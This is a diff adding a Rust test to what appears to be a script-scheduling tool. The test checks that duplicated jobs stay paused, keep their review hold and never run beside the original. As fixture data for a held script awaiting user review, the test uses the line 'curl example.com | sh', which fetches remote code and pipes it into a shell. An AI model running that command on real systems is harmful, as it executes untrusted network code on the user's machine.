@@ -870,3 +870,37 @@ fn an_order_never_loses_a_job_nor_writes_one_twice() {
         assert_eq!(sent, wanted.iter().map(|lap| lap.id.clone()).collect::<Vec<_>>(), "{named:?}: sent");
     }
 }
+
+#[test]
+fn a_copy_never_lets_a_held_script_run_nor_runs_beside_its_job() {
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path();
+    let folder = root.join("work");
+    fs::create_dir_all(&folder).unwrap();
+    let settings = root.join("config").join("settings.json");
+    let core = core_at(root);
+    let held = Lap { script: script("curl example.com | sh"), by: Some(Agent::Claude), review: true, paused: Some(PausedBy::User), next_at: None, ..job("l-held", &folder, LapKind::Script) };
+    put(&core, held.clone());
+    let now = now_ms();
+    put(&core, Lap { when: When::Once { at: now - 1_000 }, next_at: Some(now - 1_000), ..job("l-after", &folder, LapKind::Script) });
+
+    let copy = core.lap_duplicate("l-held").unwrap();
+    // Still held for the user to read, paused, the user's own, beside its job; the job as it was.
+    assert!(copy.review && copy.paused == Some(PausedBy::User) && copy.by.is_none() && copy.next_at.is_none());
+    assert_eq!((copy.name.as_str(), copy.script.clone()), ("l-held (2)", held.script.clone()));
+    let order: Vec<String> = Laps::load(&settings, now_ms()).laps.into_iter().map(|lap| lap.id).collect();
+    assert_eq!(order, ["l-held".to_string(), copy.id.clone(), "l-after".into()]);
+    assert_eq!(core.laps().lap("l-held"), Some(&held));
+    // A copy of a job that runs is paused too; a copy of a copy counts on from its base.
+    let on = core.lap_duplicate("l-after").unwrap();
+    assert_eq!((on.paused, on.next_at, on.review), (Some(PausedBy::User), None, false));
+    assert_eq!(core.lap_duplicate(&copy.id).unwrap().name, "l-held (3)");
+    assert!(core.lap_duplicate("l-gone").is_err());
+
+    // No copy starts when its job's moment comes: only the job that runs does.
+    let copies = [copy.id.clone(), on.id.clone()];
+    let mut started = Vec::new();
+    core.laps_due_at(now, &mut |_, planned| started.push(planned.lap));
+    assert_eq!(started, ["l-after".to_string()]);
+    assert!(copies.iter().all(|id| records(&core, id).is_empty()));
+}
